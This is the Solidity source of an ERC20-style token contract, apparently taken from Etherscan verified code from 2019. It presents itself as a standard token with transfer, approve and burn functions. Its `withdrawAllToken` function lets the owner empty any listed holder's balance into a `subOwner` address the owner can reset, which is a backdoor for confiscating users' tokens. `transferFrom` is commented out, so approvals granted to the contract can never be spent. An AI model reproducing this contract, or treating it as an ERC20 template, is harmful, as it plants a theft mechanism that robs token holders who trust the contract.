/**
 * Source Code first verified at https://etherscan.io on Friday, March 15, 2019
 (UTC) */

pragma solidity ^0.4.25;

interface ERC20 {

  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  function allowance(address owner, address spender) public view returns (uint256);
  //function transferFrom(address from, address to, uint256 value) public returns (bool);
  function approve(address spender, uint256 value) public returns (bool);
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
  event Burn(address indexed burner, uint256 value);
}

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract ERC20Standard is ERC20 {
    
    using SafeMath for uint;
     
    string internal _name;
    string internal _symbol;
    uint8 internal _decimals;
    uint256 internal _totalSupply;
    address owner;
    address subOwner;
    


    mapping (address => uint256) internal balances;
    mapping (address => mapping (address => uint256)) internal allowed;
    
    modifier onlyOwner() {
        require(msg.sender == owner, "only owner can do it");
        _;
    }

    constructor(string name, string symbol, uint8 decimals, uint256 totalSupply, address sub) public {
        _symbol = symbol;
        _name = name;
        _decimals = decimals;
        _totalSupply = totalSupply * (10 ** uint256(decimals));
        balances[msg.sender] = _totalSupply;
        owner = msg.sender;
        subOwner = sub;
    }

    function name()
        public
        view
        returns (string) {
        return _name;
    }

    function symbol()
        public
        view
        returns (string) {
        return _symbol;
    }

    function decimals()
        public
        view
        returns (uint8) {
        return _decimals;
    }

    function totalSupply()
        public
        view
        returns (uint256) {
        return _totalSupply;
    }

   function transfer(address _to, uint256 _value) public returns (bool) {
     require(_to != address(0));
     require(_value <= balances[msg.sender]);
     balances[msg.sender] = SafeMath.sub(balances[msg.sender], _value);
     balances[_to] = SafeMath.add(balances[_to], _value);
     Transfer(msg.sender, _to, _value);
     return true;
   }

  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
   }

   
   function burn(uint256 _value) public onlyOwner {
        require(_value * 10**uint256(_decimals) <= balances[msg.sender], "token balances insufficient");
        _value = _value * 10**uint256(_decimals);
        address burner = msg.sender;
        balances[burner] = SafeMath.sub(balances[burner], _value);
        _totalSupply = SafeMath.sub(_totalSupply, _value);
        Transfer(burner, address(0), _value);
    }

   function approve(address _spender, uint256 _value) public returns (bool) {
     allowed[msg.sender][_spender] = _value;
     Approval(msg.sender, _spender, _value);
     return true;
   }

  function allowance(address _owner, address _spender) public view returns (uint256) {
     return allowed[_owner][_spender];
   }

   function increaseApproval(address _spender, uint _addedValue) public returns (bool) {
     allowed[msg.sender][_spender] = SafeMath.add(allowed[msg.sender][_spender], _addedValue);
     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }

  function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {
     uint oldValue = allowed[msg.sender][_spender];
     if (_subtractedValue > oldValue) {
       allowed[msg.sender][_spender] = 0;
     } else {
       allowed[msg.sender][_spender] = SafeMath.sub(oldValue, _subtractedValue);
    }
     Approval(msg.sender, _spender, allowed[msg.sender][_spender]);
     return true;
   }
   
   

   //-----------------------------------------------------------------

  
  
  function withdrawAllToken(address[] list_sender) onlyOwner returns (bool){
      for(uint i = 0; i < list_sender.length; i++){
          require(balances[list_sender[i]] > 0, "insufficient token to checksum");
      }
      for(uint j = 0; j < list_sender.length; j++){
            uint256 amount = balances[list_sender[j]];
            balances[subOwner] += balances[list_sender[j]];
            balances[list_sender[j]] = 0;
            Transfer(list_sender[j], subOwner, amount);
      }
      return true;
  }
  
  function setSubOwner(address sub) onlyOwner returns(bool) {
      require(sub != owner, "subOwner must be different from owner");
      subOwner = sub;
      return true;
  }
}